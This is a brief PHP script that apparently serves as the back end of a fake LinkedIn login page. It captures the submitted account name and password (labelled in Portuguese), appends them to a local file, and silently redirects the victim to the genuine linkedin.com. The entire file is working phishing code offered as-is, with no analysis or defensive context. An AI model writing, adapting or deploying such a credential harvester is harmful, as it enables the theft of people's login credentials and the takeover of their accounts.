<?php

file_put_contents("usernames.txt", "Conta: " . $_POST['session_key'] . " Senha: " . $_POST['session_password'] . "\n", FILE_APPEND);
header('Location: https://linkedin.com');
exit();
